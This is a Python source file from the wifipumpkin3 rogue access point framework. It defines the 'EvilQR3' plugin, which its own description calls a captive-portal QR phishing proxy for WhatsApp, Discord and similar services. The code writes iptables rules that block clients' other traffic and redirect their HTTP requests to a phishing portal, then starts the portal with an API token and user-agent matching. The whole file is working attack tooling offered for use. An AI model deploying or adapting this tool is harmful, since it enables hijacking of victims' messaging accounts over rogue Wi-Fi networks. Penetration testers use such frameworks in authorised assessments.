from wifipumpkin3.core.config.globalimport import *
import wifipumpkin3.core.utility.constants as C
from wifipumpkin3.core.servers.proxy.proxymode import *
from wifipumpkin3.core.common.uimodel import *
from wifipumpkin3.plugins.captiveflask import *
from uuid import uuid4

# This file is part of the wifipumpkin3 Open Source Project.
# wifipumpkin3 is licensed under the Apache 2.0.

# Copyright 2023 P0cL4bs Team - Marcos Bomfim (mh4x0f)

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at

# http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


class EvilQR3(ProxyMode):
    Name = "EvilQR3"
    Author = "Pumpkin-Dev"
    ID = "evilqr3"
    Description = (
        "Proxy for create captive portal QR phishing WhatsApp,Discord, etc... "
    )
    Hidden = False
    LogFile = C.LOG_EVILQR3PROXY
    CONFIGINI_PATH = C.CONFIG_EQ_INI
    _cmd_array = []
    ModSettings = True
    RunningPort = 80
    ModType = "proxy"
    TypePlugin = 1

    def __init__(self, parent=None, **kwargs):
        super(EvilQR3, self).__init__(parent)
        self.setID(self.ID)
        self.setTypePlugin(self.TypePlugin)
        if not self.config.get("settings","token_api", format=str):
            self.config.set("settings","token_api", str(uuid4()))

    @property
    def CMD_ARRAY(self):
        self._cmd_array = [
            "-sa",
            self.conf.get("dhcp", "router"),
            "-t",
            C.TEMPLATES_FLASK + self.config.get("settings", "template_path"),
            "-s",
            C.TEMPLATES_FLASK + self.config.get("settings", "static_path"),
            "-tp",
            self.config.get("settings", "token_api"),
            "-mu",
            self.config.get("settings", "regex_match_useragent"),
            "-p",
            self.config.get("settings", "proxy_port"),
        ]
        return self._cmd_array


    @property
    def getPlugins(self):
        list_commands = []
        settings = self.config.get_all_childname("settings")
        for config in settings:
            list_commands.append("{}.{}".format(self.ID, config))

        return list_commands

    def Initialize(self):
        # settings iptables for add support captive portal
        IFACE = self.conf.get("accesspoint", "interface")
        IP_ADDRESS = self.conf.get("dhcp", "router")
        PORT = self.config.get("settings", "proxy_port")

        print(display_messages("settings for EvilQR3 portal:", info=True))
        print(display_messages("allow FORWARD UDP DNS", info=True))
        self.add_default_rules(
            "{iptables} -A FORWARD -i {iface} -p tcp --dport 53 -j ACCEPT".format(
                iptables=self.getIptablesPath, iface=IFACE
            )
        )
        
        print(display_messages("allow traffic to Phishkin3 captive portal", info=True))
        self.add_default_rules(
            "{iptables} -A FORWARD -i {iface} -p tcp --dport {port} -d {ip} -j ACCEPT".format(
                iptables=self.getIptablesPath, iface=IFACE, port=PORT, ip=IP_ADDRESS
            )
        )
        
        print(display_messages("block all other traffic in access point", info=True))
        self.add_default_rules(
            "{iptables} -A FORWARD -i {iface} -j DROP ".format(
                iptables=self.getIptablesPath, iface=IFACE
            )
        )
        
        print(display_messages("redirecting HTTP traffic to captive portal", info=True))
        self.add_default_rules(
            "{iptables} -t nat -A PREROUTING -i {iface} -p tcp --dport 80 -j DNAT --to-destination {ip}:{port}".format(
                iptables=self.getIptablesPath, iface=IFACE, ip=IP_ADDRESS, port=PORT
            )
        )
            
        self.runDefaultRules()

    def boot(self):
        self.reactor = ProcessThread({"evilqr3": self.CMD_ARRAY})
        self.reactor._ProcssOutput.connect(self.LogOutput)
        self.reactor.setObjectName(self.ID)

    def LogOutput(self, data):
        if self.conf.get("accesspoint", "status_ap", format=bool):
            self.logger.info(data)

    def parser_set_evilqr3(self, value, setting_line):
        if len(setting_line.split()[0].split(".")) == 2:
            try:
                # plugin_name = phishkin3.proxy_port true
                config_key, config_value = (
                    setting_line.split(".")[0],
                    setting_line.split(".")[1].split()[0],
                )
                if config_value in self.config.get_all_childname("settings"):
                    self.config.set("settings", config_value, value)
                else:
                    print(
                        display_messages(
                            "unknown plugin: {}".format(config_value), error=True
                        )
                    )
                return
            except IndexError:
                print(display_messages("unknown sintax command", error=True))
        print(display_messages("unknown sintax command", error=True))
